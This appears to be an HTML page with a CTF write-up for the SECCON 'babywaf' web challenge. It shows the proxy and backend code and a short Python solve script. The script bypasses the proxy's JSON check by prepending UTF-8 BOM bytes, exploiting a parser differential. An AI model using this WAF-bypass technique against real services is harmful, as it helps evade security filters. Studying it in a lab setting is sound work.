@@ -1,0 +1,292 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>babywaf</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - babywaf</h1>
+<p>We're given the following files.</p>
+<pre class="language-js"><code class="language-js">├── backend
+│   ├── Dockerfile
+│   ├── index<span class="token punctuation">.</span>html
+│   ├── index<span class="token punctuation">.</span>js
+│   ├── <span class="token keyword">package</span><span class="token operator">-</span>lock<span class="token punctuation">.</span>json
+│   └── <span class="token keyword">package</span><span class="token punctuation">.</span>json
+├── docker<span class="token operator">-</span>compose<span class="token punctuation">.</span>yml
+└── proxy
+    ├── Dockerfile
+    ├── index<span class="token punctuation">.</span>js
+    ├── <span class="token keyword">package</span><span class="token operator">-</span>lock<span class="token punctuation">.</span>json
+    └── <span class="token keyword">package</span><span class="token punctuation">.</span>json
+
+<span class="token number">3</span> directories<span class="token punctuation">,</span> <span class="token number">10</span> files</code></pre>
+<p>Looking at the <code>docker-compose.yml</code> file we can see that the backend service has the flag.</p>
+<pre class="language-docker-compose"><code class="language-docker-compose">services:
+  proxy:
+    build: ./proxy
+    restart: unless-stopped
+    ports:
+      - 3000:3000
+  backend:
+    build: ./backend
+    restart: unless-stopped
+    environment:
+      - FLAG=SECCON{dummy}</code></pre>
+<p>The following excerpt shows the code in the <code>backend/index.js</code> file.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs/promises"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">??</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"No flag"</span><span class="token punctuation">)</span> <span class="token operator">??</span> process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"givemeflag"</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"🤔"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">_req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> html <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>This looks incredibly simple, based on this code we just need to send a POST body that contains <code>givemeflag</code>. Let's check <code>proxy/index.js</code> to see what the proxy does.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fastify"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"@fastify/http-proxy"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+  <span class="token literal-property property">upstream</span><span class="token operator">:</span> <span class="token string">"http://backend:3000"</span><span class="token punctuation">,</span>
+  <span class="token function-variable function">preValidation</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token comment">// WAF???</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+      <span class="token keyword">const</span> body <span class="token operator">=</span>
+        <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token operator">?</span> req<span class="token punctuation">.</span>body <span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"givemeflag"</span> <span class="token keyword">in</span> body<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"🚩"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">replyOptions</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token function-variable function">rewriteRequestHeaders</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">_req<span class="token punctuation">,</span> headers</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+      headers<span class="token punctuation">[</span><span class="token string">"content-type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"application/json"</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> headers<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">"0.0.0.0"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Okay, so the proxy rejects the request if it sees <code>givemeflag</code> in the POST body. It'll do this comparison on either <code>req.body</code> or <code>JSON.parse(req.body)</code> depending on the form of our request. Based on this, we either need a JSON parser differential between <code>fastify</code> and <code>express</code> or <code>JSON.parse</code> and <code>express</code>. I found here: <a href="https://github.com/fastify/fastify/blob/38973670e5a90d7ea6dbce12977e9d7cf9aa7c75/lib/content-type-parser.js#L5">content-type-parser.js#L5 | Fastify</a> that Fastify uses the <code>secure-json-parse</code> package for JSON parsing.</p>
+<p>Looking at the <code>secure-json-parse</code> source code, I saw that they had a <code>/test/</code> directory for test cases. These can sometimes be useful for looking at edge-cases or standards that the library has considered or implemented. In <code>/test/index.test.js</code> I found the following test case.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'parse string with BOM'</span><span class="token punctuation">,</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> theJson <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'world'</span> <span class="token punctuation">}</span>
+  <span class="token keyword">const</span> buffer <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+    Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// the utf8 BOM</span>
+    Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>theJson<span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token punctuation">]</span><span class="token punctuation">)</span>
+  t<span class="token punctuation">.</span><span class="token function">deepEqual</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> theJson<span class="token punctuation">)</span>
+  t<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+<p>This code suggests that a &quot;UTF-8 BOM&quot; byte sequence should be ignored during parsing. BOM stands for &quot;Byte order mark&quot;; from my understanding it's (obviously) used to indicate byte order (e.g. big/small endian), but can also indicate the use of certain encodings depending on its form. Using this, I tried replicating the test case against the challenge.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+
+PROXIES <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span><span class="token punctuation">,</span>
+    <span class="token string">"https"</span><span class="token punctuation">:</span><span class="token string">"http://localhost:8080"</span>
+<span class="token punctuation">}</span>
+
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>proxies <span class="token operator">=</span> PROXIES
+s<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"text/plain;charset=UTF-8"</span>
+<span class="token punctuation">}</span>
+s<span class="token punctuation">.</span>verify <span class="token operator">=</span> <span class="token boolean">False</span>
+
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"givemeflag"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span>
+payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b"\xef\xbb\xbf"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://localhost:3000/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span></code></pre>
+<p>Surprisingly, this worked.</p>
+<pre class="language-bash"><code class="language-bash">└─$ python3 solve.py
+b<span class="token string">'\xef\xbb\xbf{"givemeflag": true}'</span>
+b<span class="token string">'SECCON{dummy}'</span></code></pre>
+<p>I thought at first that this might have been a difference between Fastify and Express, but after doing some debugging I found that it was actually a result of <code>JSON.parse</code> not supporting BOM bytes.</p>
+<pre class="language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'\xef\xbb\xbf{"test":"test"}'</span><span class="token punctuation">)</span>
+Uncaught SyntaxError<span class="token operator">:</span> Unexpected token <span class="token string">'ï'</span><span class="token punctuation">,</span> <span class="token string">"ï»¿{"</span>test<span class="token string">":"</span>test<span class="token string">"}"</span> is not valid <span class="token constant">JSON</span></code></pre>
+<p>Following the solve I read Arks official writeup: <a href="https://blog.arkark.dev/2023/12/28/seccon-finals#web-babywaf">https://blog.arkark.dev/2023/12/28/seccon-finals#web-babywaf</a>, which references the following quote from <a href="https://datatracker.ietf.org/doc/html/rfc8259">RFC8259</a>.</p>
+<blockquote>
+<p>Implementations MUST NOT add a byte order mark (U+FEFF) to the
+beginning of a networked-transmitted JSON text.  In the interests of
+interoperability, implementations that parse JSON texts MAY ignore
+the presence of a byte order mark rather than treating it as an
+error.</p>
+</blockquote>
+<p>This was pretty cool, and makes me want to spend more time reading RFCs like this.</p>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
